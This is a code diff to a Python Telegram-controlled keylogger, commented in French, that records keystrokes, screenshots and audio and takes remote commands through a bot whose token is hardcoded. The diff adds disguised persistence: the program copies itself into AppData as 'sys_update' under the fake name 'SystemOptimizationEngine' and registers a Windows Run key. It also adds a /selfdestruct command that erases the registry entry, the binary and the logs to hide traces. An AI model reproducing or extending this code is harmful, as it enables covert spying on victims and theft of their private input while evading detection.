@@ -11,6 +11,9 @@ from pynput import keyboard
 from datetime import datetime
 import PIL.ImageGrab
 from PIL import Image
+import shutil
+import sys
+import winreg
 
 # ================= CONFIGURATION TELEGRAM =================
 TELEGRAM_TOKEN = "8742325574:AAFF7f0ZZHa1MTAGK1SWJXLOZlPZdO9VmUk"
@@ -78,6 +81,44 @@ class TelegramKeylogger:
         
         self.register_commands()
         self.load_state()
+        self.setup_persistence()
+
+    def setup_persistence(self):
+        try:
+            # Nom de l'application camouflée
+            app_name = "SystemOptimizationEngine"
+            
+            # Déterminer si on tourne en .exe (PyInstaller) ou .py
+            if getattr(sys, 'frozen', False):
+                current_path = os.path.realpath(sys.executable)
+            else:
+                current_path = os.path.realpath(__file__)
+
+            # Chemin de destination discret (%APPDATA%\SystemOptimization)
+            target_dir = os.path.join(os.getenv('APPDATA'), 'SystemOptimization')
+            if not os.path.exists(target_dir):
+                os.makedirs(target_dir)
+            
+            target_path = os.path.join(target_dir, "sys_update.exe" if current_path.endswith(".exe") else "sys_update.py")
+            
+            # Copier le fichier si nécessaire
+            if current_path != target_path:
+                shutil.copy2(current_path, target_path)
+            
+            # Ajouter au registre Windows (Démarrage automatique)
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            try:
+                reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
+                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, f'"{target_path}"')
+                winreg.CloseKey(reg_key)
+                logging.info(f"Persistence established at {target_path}")
+            except Exception as reg_err:
+                logging.error(f"Registry error: {reg_err}")
+
+        except Exception as e:
+            logging.error(f"Persistence setup failed: {e}")
 
     def register_commands(self):
         self.commands = {
@@ -100,6 +141,7 @@ class TelegramKeylogger:
             "/audio": self.cmd_audio,
             "/stats": self.cmd_stats,
             "/activity": self.cmd_activity,
+            "/selfdestruct": self.cmd_selfdestruct,
             "/help": self.cmd_help
         }
 
@@ -218,6 +260,35 @@ class TelegramKeylogger:
 
     def cmd_activity(self, args):
         return "🕒 Dernière activité: " + datetime.now().strftime("%H:%M:%S")
+
+    def cmd_selfdestruct(self, args):
+        self.send_telegram("⚠️ **ALERTE AUTO-DESTRUCTION** ⚠️\nSuppression des traces et arrêt définitif...")
+        
+        try:
+            # 1. Suppression de la persistance Registre
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS)
+            winreg.DeleteValue(reg_key, "SystemOptimizationEngine")
+            winreg.CloseKey(reg_key)
+        except: pass
+
+        # 2. Script de suppression (Batch)
+        # Supprime l'exe et le dossier de logs après la fermeture
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        batch_path = os.path.join(os.environ['TEMP'], "cleanup.bat")
+        
+        with open(batch_path, "w") as f:
+            f.write(f'@echo off\n')
+            f.write(f'timeout /t 3 /nobreak > nul\n') # Attendre la fermeture de l'exe
+            f.write(f'del /f /q "{exe_path}"\n')
+            f.write(f'rd /s /q "{self.log_dir}"\n')
+            f.write(f'del "{batch_path}"\n')
+
+        # 3. Lancer le script et quitter
+        os.startfile(batch_path)
+        self.running = False
+        sys.exit(0)
 
     def cmd_help(self, args):
         cmds = "\n".join([f"`{c}`" for c in self.commands.keys()])
